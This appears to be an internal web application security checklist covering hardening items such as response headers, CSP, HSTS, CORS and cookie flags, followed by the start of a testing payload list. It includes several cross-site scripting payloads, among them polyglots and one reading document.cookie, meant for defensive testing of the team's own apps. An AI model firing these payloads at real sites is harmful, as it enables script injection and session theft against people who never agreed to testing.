
## Continuous Review
Please continue to evaluate the Continous Review section and response headers sections of the checklist as you go through the entire assessment. We encourage app teams to update the checklist and Payload lists with language specific links and company policies to ensure future developers follow the companies requirements.
### Verbose Error Messages
Error messages should be short and generic. Do not show stack traces or informative messages to the user.
### Autocomplete Disabled on Sensitive Input Fields
Emails, password, challenge questions, and other sensitive information should have autocomplete=off.
### Sensitive Information is Masked
NPI should be masked to reduce shoulder surfing attacks.
### Sensitive Information Not in URL
Do not send sensitive information in GET request parameters.
### Unneccessary Methods are Disabled
Do not allow unsafe methods such as Trace or Connect on any endpoint. Disable delete, post, etc if not needed on the endpoint.
### HTTP Disabled
Force HTTPS connections.

## Response Headers
The following tools will check the response headers of your application and report on any insecurities or misconfigurations. We highly recommend checking the response headers manually because these tools may not follow the requirements of your organization. Additionally, most of these tools are limited to unauthenticated checks, meaning that sensitive authenticated responses will not be evaluated.

https://securityheaders.com/

https://hackertarget.com/http-header-check/

### Content-security-policy 
The CSP should include script-src and default-src. Do not use unsafe directives, such as unsafe-inline or unsafe-eval. Do not include wildcards in the CSP unless they are used in the subdomain of a trusted site. 

Quick Guide: https://content-security-policy.com/

Evaulation Tool: https://csp-evaluator.withgoogle.com/
### Strict-Transport-Security
The Strict-Transport-Security response header should contain the max-age directive set to 1 year or greater and the includeSubdomains directive. If the application is externally available, include the Preload directive.

### Caching
**Cache-Control** - Set the cache-control response header to include the “no-store” flag in all responses.

**Expires** - Set the Expires header to a date in the past, or zero, in all responses.

### Information Leak Headers
Do not allow response headers that may give an attacker insight into teh technology stack utilized for this applications.
Examples include: Server, X-Powered-By.

### CORS Headers
Do not set Access-Control-Allow-Origin to wildcard or reflect arbitrary origins/subdomains.

https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

## Cookies
All cookies should have the following attributes: Secure, HttpOnly, SameSite: lax or strict.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie

This payload list will include a diverse set of basic payloads for each attack type with the goal of identifying the vulnerability using the least amount of attempts. For a longer list of payloads, see the LongPayloadList document or review the sources below. While this payload list was hand selected from my own personal notes(generated over the course of 3 years), most of the payloads can be found in the sources below.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

https://book.hacktricks.wiki/en/index.html

https://portswigger.net/web-security/all-topics



## Cross-Site Scripting (XSS):

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

Enter the following payloads into user input fields and see how they are reflected in the application. If the user input is reflected back unencoded and unfiltered, especially in javascript, then XSS is likely.

```
<b>test</b> 
<script>alert(1)</script>

<img src=1 onerror=alert(1)>

javascript:alert(document.cookie)

"onmouseover="alert(1)

${alert(1)}

alert`1`

‘-alert()-’
```

**Polyglot payloads**

Please note that these are much louder payloads, meaning they are more likely to raise alarm from your cyber security department.

```
0xsobky
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

Mathias Karlsson
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```


## SQL Injection
Review the following site for a cheat sheet showing specific requirements and payloads for the most common databases. This will help tailor the following payloads to your environment. For example, if your application uses MySQL, replace the `--` in the commands below with `#`.

https://portswigger.net/web-security/sql-injection/cheat-sheet

